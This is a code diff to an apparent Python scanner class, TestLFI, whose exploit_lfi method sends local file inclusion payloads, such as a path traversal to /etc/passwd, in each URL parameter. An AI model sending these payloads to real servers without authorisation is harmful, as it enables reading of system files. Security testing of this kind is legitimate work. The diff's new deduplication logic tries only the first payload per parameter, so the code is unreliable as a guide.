@@ -1,3 +1,4 @@
+from threading import main_thread
 from requests import get
 
 
@@ -5,6 +6,7 @@ class TestLFI:
     def __init__(self, log, console) -> None:
         self.log = log
         self.console = console
+        self.tested_urls = []
         self.lfi_tests = [
             r"../../../../../etc/passwd",
             r"/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2"
@@ -62,8 +64,16 @@ class TestLFI:
     def exploit_lfi(self, base_url, url_params) -> None:
         for param in url_params:
             for test in self.lfi_tests:
-                param_no_value = param.rsplit("=",1)
-                test_url = f"{base_url}?{param_no_value}={test}"
+                param_no_value = param.split("=")[0]
+                main_url = f"{base_url}?{param_no_value}"
+
+                if not main_url in self.tested_urls:
+                    self.tested_urls.append(main_url)
+                    test_url = f"{main_url}={test}"
+                else:
+                    continue
+
+                
                 try:
                     response = get(test_url)
                 except ConnectionError:
